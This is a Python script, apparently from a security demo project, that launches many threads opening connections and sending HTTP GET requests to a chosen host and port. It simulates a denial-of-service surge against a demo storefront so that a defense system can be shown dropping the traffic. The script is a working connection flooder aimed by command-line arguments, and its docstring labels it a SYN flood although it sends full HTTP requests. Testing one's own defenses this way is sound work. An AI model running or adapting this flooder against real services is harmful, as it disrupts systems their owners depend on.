#!/usr/bin/env python3
"""
Chakravyuh AI: High-Density Traffic / SYN Flood Simulator
Simulates a high-frequency DoS/LOIC-HTTP traffic surge against the defense target or demo e-commerce storefront.
"""

import socket
import sys
import time
import threading
import argparse

stop_event = threading.Event()
sent_count = 0
dropped_count = 0
counter_lock = threading.Lock()

def flood_worker(target_ip: str, target_port: int, worker_id: int):
    global sent_count, dropped_count
    payload = (
        b"GET /api/checkout HTTP/1.1\r\n"
        b"Host: " + target_ip.encode() + b"\r\n"
        b"User-Agent: Chakravyuh-Bench/2.0 (Adversarial-Simulator)\r\n"
        b"Accept: */*\r\n"
        b"Connection: close\r\n\r\n"
    )
    
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((target_ip, target_port))
            s.sendall(payload)
            s.close()
            with counter_lock:
                sent_count += 1
        except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError, socket.timeout):
            with counter_lock:
                dropped_count += 1
        except Exception:
            with counter_lock:
                dropped_count += 1
        time.sleep(0.0005)

def start_traffic_flood(target_ip: str = "127.0.0.1", target_port: int = 5000, threads: int = 24, duration: int = 10):
    global sent_count, dropped_count
    sent_count = 0
    dropped_count = 0

    print(f"==================================================")
    print(f"[ATTACK SIMULATION] Launching High-Density Traffic Surge on {target_ip}:{target_port}")
    print(f"Target: Port {target_port} (E-Commerce Demo Storefront / API)")
    print(f"Workers: {threads} | Duration: {duration}s")
    print(f"==================================================")
    
    stop_event.clear()
    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(target_ip, target_port, i))
        t.daemon = True
        t.start()
        thread_pool.append(t)
        
    try:
        for remaining in range(duration, 0, -1):
            with counter_lock:
                curr_sent = sent_count
                curr_dropped = dropped_count
            soar_indicator = f" | 🛡️ Neutralized by SOAR: {curr_dropped}" if curr_dropped > 0 else ""
            sys.stdout.write(f"\r[⚡] Flood Surge: {curr_sent} pkts sent{soar_indicator} ({remaining}s remaining) ")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAborted by user.")
        
    stop_event.set()
    with counter_lock:
        print(f"\n[✓] Traffic flood finished. Total Sent: {sent_count} | Dropped / Isolated by SOAR: {dropped_count}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Chakravyuh AI: High-Density Traffic / DoS Flood Simulator")
    parser.add_argument("target", nargs="?", default="127.0.0.1", help="Target Defense IP (default: 127.0.0.1)")
    parser.add_argument("port", nargs="?", type=int, default=5000, help="Target Port (default: 5000 for E-Commerce / 8000 for API)")
    parser.add_argument("--workers", "--threads", "-w", "-t", type=int, default=24, help="Concurrent workers (default: 24)")
    parser.add_argument("--duration", "-d", type=int, default=10, help="Duration in seconds (default: 10)")

    args, unknown = parser.parse_known_args()
    start_traffic_flood(args.target, args.port, args.workers, args.duration)
